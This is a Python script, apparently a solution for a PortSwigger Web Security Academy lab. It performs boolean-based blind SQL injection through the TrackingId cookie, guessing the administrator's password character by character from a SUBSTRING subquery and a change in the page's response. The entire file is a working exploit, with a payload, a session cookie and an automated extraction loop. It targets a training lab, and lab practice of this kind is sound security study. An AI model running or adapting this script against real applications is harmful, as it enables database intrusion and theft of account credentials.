import requests
from bs4 import BeautifulSoup
import string

alphanumeric_lower = string.digits + string.ascii_lowercase
alphanumeric_lower_list = list(alphanumeric_lower)

# set your url for lab
url = "https://0aa500cd04082459803f5eb9007e0082.web-security-academy.net/"
password = ""
i = 0

while i < 36:
    guess = password + alphanumeric_lower_list[i]
    lg = len(guess)

    TrackingId = f"fgOuWFwqKJvDDChz' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), 1, {lg}) = '{guess}'----"
    print(TrackingId)
    
    cookies = {
        "session": "MN6WMC91PMR6eknytZRxoN4wm7syZR1l",
        "TrackingId": TrackingId
    }

    response = requests.get(url, cookies=cookies)
    soup = BeautifulSoup(response.text, "html.parser")

    top_links = soup.find(class_="top-links")
    div_inside = top_links.find("div")

    if div_inside:
        password = guess
        i = 0
        print(True)
    else:
        i += 1
        print(False)

print("Password: ", password)